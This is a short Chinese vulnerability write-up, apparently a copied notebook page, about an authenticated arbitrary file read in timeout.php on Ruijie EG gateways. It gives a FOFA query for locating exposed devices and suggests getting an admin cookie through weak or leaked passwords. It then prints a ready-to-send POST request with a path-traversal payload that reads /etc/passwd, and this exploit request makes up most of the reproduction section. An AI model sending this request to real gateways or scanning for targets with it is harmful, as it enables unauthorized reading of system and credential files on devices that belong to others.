# 锐捷EG易网关timeout.php后台任意文件读取漏洞

**<font style="color:rgb(38, 38, 38);">一、漏洞简介</font>**

<font style="color:rgb(38, 38, 38);">锐捷EG易网关timeout.php后台任意文件读取漏洞 </font>

**<font style="color:rgb(38, 38, 38);">二、影响版本</font>**

锐捷 EG易网关  
**<font style="color:rgb(38, 38, 38);">三、资产测绘</font>**  
<font style="color:rgb(38, 38, 38);">●登录页面</font>

<font style="color:rgb(38, 38, 38);">fofa:</font>`app="Ruijie-EG易网关" `

![1710773302248-caa9069a-265b-44c3-8a1c-ee627b562553.png](./img/yxrLThOg1twrBoJM/1710773302248-caa9069a-265b-44c3-8a1c-ee627b562553-724511.webp)

![1711943727100-3a29a6a6-7b50-4246-af35-4ebf47636d48.png](./img/yxrLThOg1twrBoJM/1711943727100-3a29a6a6-7b50-4246-af35-4ebf47636d48-662596.png)

  
**<font style="color:rgb(38, 38, 38);">四、漏洞复现</font>**  
1通过弱口令或账号密码泄露漏洞登录后台获取cookie  


![1711298713325-517a2298-d16c-4786-a1f9-3e40836a4f8c.png](./img/yxrLThOg1twrBoJM/1711298713325-517a2298-d16c-4786-a1f9-3e40836a4f8c-386082.webp)

2通过上一步获取的cookie执行命令

```plain
POST /system_pi/timeout.php?a=getFile HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Cookie: LOCAL_LANG_COOKIE=zh; RUIJIEID=bnrul7jabde55u5moo2a4q57a0; helpKey=home_sys;user=admin
X-Requested-With: XMLHttpRequest
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-Length: 22

fileName=../etc/passwd
```

![1714062449229-3cce8ba1-8f09-4704-bcf3-73117674ac5a.png](./img/yxrLThOg1twrBoJM/1714062449229-3cce8ba1-8f09-4704-bcf3-73117674ac5a-281506.png)



> 更新: 2024-06-24 11:42:25  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/oyykknetnegphzzm>